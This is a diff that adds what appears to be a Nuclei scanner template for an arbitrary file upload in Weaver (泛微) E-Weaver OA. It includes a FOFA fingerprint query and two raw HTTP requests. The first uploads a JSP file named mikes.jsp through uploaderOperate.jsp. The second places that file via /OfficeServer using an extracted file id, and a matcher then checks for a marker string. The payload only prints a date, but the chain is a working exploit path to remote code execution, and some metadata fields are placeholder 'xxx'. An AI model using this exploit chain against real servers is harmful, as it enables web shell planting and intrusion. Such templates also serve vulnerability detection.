@@ -1,0 +1,72 @@
+id: weaver-oa-workrelate-file-upload
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-E-Weaver"
+http:
+  - raw:
+      - |
+        POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Content-Length: 1822
+
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="secId"
+
+        1
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="Filedata"; filename="mikes.jsp"
+
+        <% out.println("20231101");%>
+
+
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="plandetailid"
+
+        1
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj-- 
+
+      - |
+        POST /OfficeServer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+        Content-Length: 206
+
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+        Content-Disposition: form-data; name="aaa"
+
+        {"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{ff}}"}
+        ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+
+      # - |
+      #   GET /mikes.jsp HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+      #   Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "20231101"
+
+          # - "ViewDoc"    #检测是否存在漏洞特征，POC
+    extractors:
+      - type: regex
+        name: ff
+        part: body
+        internal: true # Required for using dynamic variables
+        group: 1
+        regex:
+          - "&fileid=([[:alnum:]]+)"
